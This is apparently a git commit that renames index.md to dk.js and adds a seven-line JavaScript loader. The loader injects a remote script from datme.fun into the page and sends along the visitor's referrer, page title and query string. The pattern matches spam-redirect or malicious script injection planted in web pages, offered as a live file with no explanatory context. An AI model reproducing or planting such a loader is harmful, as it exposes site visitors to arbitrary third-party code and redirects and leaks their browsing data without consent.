ed834842c908645f39e77b488819d8f4661f7e27
JOLLYhit <72670377+JOLLYhit@users.noreply.github.com>
2020-10-10 22:54:48 +0300

    Update and rename index.md to dk.js

---
+++ dk.js
@@ -0,0 +1,7 @@
+var d=document;var s=d.createElement('script'); 
+s.src='//datme.fun/fHkywC?frm=script&se_referrer=' + encodeURIComponent(document.referrer) + '&default_keyword=' + encodeURIComponent(document.title) + '&'+window.location.search.replace('?', '&')+''; 
+if (document.currentScript) { 
+document.currentScript.parentNode.insertBefore(s, document.currentScript);
+} else {
+d.getElementsByTagName('head')[0].appendChild(s);
+}
